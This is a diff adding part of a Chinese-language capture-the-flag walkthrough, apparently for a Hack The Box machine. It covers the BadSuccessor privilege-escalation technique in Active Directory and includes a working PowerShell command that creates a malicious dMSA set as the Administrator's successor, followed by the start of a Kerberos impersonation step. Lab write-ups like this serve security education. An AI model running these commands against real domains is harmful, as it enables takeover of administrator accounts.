@@ -342,3 +342,39 @@ export KRB5CCNAME=adam.scott.ccache
 
 ### 利用程序
 
+Akamai 博客提供了详细的利用步骤。我们参考官方的 writeup https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory ,并使用 GitHub 上的这个 PoC。
+
+#### 查找可写入的 OU
+
+使用 `find` 命令再次确认我们可以写入特定的 OU：
+
+#### 创建恶意 dMSA
+
+现在创建一个恶意的 dMSA 来继承目标的权限：
+
+```powershell
+.\BadSuccessor.exe escalate `
+-targetOU "OU=STAFF,DC=eighteen,DC=htb" `
+-dmsa web_svc `
+-targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" `
+-dnshostname FinancialPlanning `
+-user adam.scott `
+-dc-ip 127.0.0.1
+
+# for cleanup
+# .\BadSuccessor.exe del web_svc "OU=STAFF,DC=eighteen,DC=htb"
+```
+
+由于当前权限限制，我们只能针对 STAFF 组织单位进行操作：
+
+新创建的 dMSA： `web_svc` → 主机： `web_svc$` ，现在通过以下方式成为 Administrator 账户的继任者：
+
+- `msDS-ManagedAccountPrecededByLink = Administrator`
+
+- `msDS-DelegatedMSAState = 2`
+#### 模拟
+
+随着恶意 dMSA 的建立，我们现在可以使用标准的 Kerberos 模拟来提取凭证。尽管像 `Rubeus` 这样的工具在那些演示中引入使用，但我们的先前 `evil-winrm` 登录凭证（NTLM）在缓存票据方面往往存在问题——因此我们将完全从我们的隧道 Kerberos 工作站进行操作。
+
+运行 `getST.py` 针对提升后的后继对象 `web_svc$` :
+
